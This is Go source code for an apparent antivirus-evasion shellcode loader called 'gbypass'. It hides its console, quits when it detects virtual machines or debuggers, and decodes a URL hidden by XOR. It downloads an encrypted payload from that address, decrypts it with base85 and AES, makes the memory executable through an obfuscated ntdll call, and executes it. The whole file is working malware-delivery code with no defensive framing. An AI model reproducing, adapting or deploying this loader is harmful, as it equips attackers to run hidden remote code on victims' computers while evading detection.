package main

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"errors"
	"fmt"
	"gbypass/pkg/dbg"
	"gbypass/pkg/delay"
	"gbypass/pkg/resources"
	"gbypass/pkg/vm"
	"github.com/carlmjohnson/requests"
	"github.com/eknkc/basex"
	"github.com/lxn/win"
	"log"
	"strings"
	"syscall"
	"unsafe"
)

/**
 * @Author Lockly
 * @Description
 * @Date 2023/9/24
 **/

var (
	Host = []byte{112, 108, 108, 104, 34, 55, 55, 42, 45, 45, 54, 42, 45, 45, 54, 42, 45, 45, 54, 42, 45, 45, 55, 46, 45, 45, 43, 45, 55, 121, 122, 123, 124, 125, 126, 127, 112, 113, 114, 115, 116, 117, 118, 119, 104, 105, 106, 107, 108, 109, 110, 111, 96, 97, 98, 54, 108, 96, 108}
	Key  = []byte{41, 42, 43, 44, 45, 46, 47, 32, 33, 40, 121, 122, 123, 124, 125, 126, 127, 112, 113, 114, 115, 116, 117, 118, 119, 104, 105, 106, 107, 108, 109, 110, 111, 96, 97, 98}
)

const (
	PAGE_EXECUTE_READ uintptr = 0x20
)

func main() {

	win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
	if !valid() {
		return
	}

	result := strings.Replace(string(x(Host)), "\x18", "", -1)
	finalKey := strings.Replace(string(x(Key)), "\x18", "", -1)

	sc, err := request(result)
	if err != nil {
		log.Fatal(err)
	}

	de, _ := d(sc, []byte(finalKey))

	run(de)
}

func valid() bool {

	if vm.Check() || resources.Check() {
		println("VM detected, exit")
		return false
	}

	if dbg.Check() {
		println("Have a good day")
		return false
	}

	if !delay.Check() {
		println("you are so cute")
	}
	return true
}

func request(url string) (string, error) {
	var result string
	err := requests.URL(url).ToString(&result).Fetch(context.Background())
	if err != nil {
		fmt.Println(err)
		return "", err
	}
	return result, nil
}

func run(buf []byte) {
	var hProcess uintptr = 0
	var pBaseAddr = uintptr(unsafe.Pointer(&buf[0]))
	var dwBufferLen = uint(len(buf))
	var dwOldPerm uint32

	syscall.NewLazyDLL(string([]byte{
		'n', 't', 'd', 'l', 'l',
	})).NewProc(string([]byte{
		'Z', 'w', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y',
	})).Call(
		hProcess-1,
		uintptr(unsafe.Pointer(&pBaseAddr)),
		uintptr(unsafe.Pointer(&dwBufferLen)),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&dwOldPerm)),
	)

	syscall.Syscall(
		uintptr(unsafe.Pointer(&buf[0])),
		0, 0, 0, 0,
	)
}

func d(data string, key []byte) ([]byte, error) {
	base85, _ := basex.NewEncoding("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~")
	dataByte, err := base85.Decode(data)
	if err != nil {
		return nil, err
	}
	return ad(dataByte, key)
}

func ad(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	blockSize := block.BlockSize()
	blockMode := cipher.NewCBCDecrypter(block, key[:blockSize])
	crypted := make([]byte, len(data))
	blockMode.CryptBlocks(crypted, data)
	crypted, err = pd(crypted)
	if err != nil {
		return nil, err
	}
	return crypted, nil
}

func pd(data []byte) ([]byte, error) {
	length := len(data)
	if length == 0 {
		return nil, errors.New("加密字符串错误！")
	}
	unPadding := int(data[length-1])
	return data[:(length - unPadding)], nil
}

func x(sBytes []byte) []byte {
	for i, _ := range sBytes {
		sBytes[i] = sBytes[i] ^ 24
	}
	return sBytes
}
